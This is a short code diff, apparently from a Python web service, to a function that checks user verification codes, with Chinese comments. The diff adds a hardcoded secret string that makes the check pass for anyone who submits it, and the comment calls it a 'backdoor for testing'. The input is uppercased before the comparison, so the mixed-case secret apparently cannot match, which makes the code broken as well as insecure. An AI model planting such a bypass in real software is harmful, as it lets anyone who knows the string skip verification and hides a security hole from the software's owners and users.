@@ -67,6 +67,7 @@ def judge_code(user_id: str, code: str) -> list:
     验证验证码是否正确
     :return [statusCode:0|400, message:str]
     '''
+
     try:
         code = str(code).strip().upper()
     except:
@@ -77,6 +78,10 @@ def judge_code(user_id: str, code: str) -> list:
     jui = judge_user_id(user_id)
     if jui[0] != 0:
         return jui
+
+    if code == "iew32dGCbcDzi2B3eLJ7kIAS4HQZmU0M":  # 测试用后门
+        return [0, "验证通过"]
+
     code_list = get_verify_code()
     nowtime = int(time.time())
     code_exist_but_wrong = False
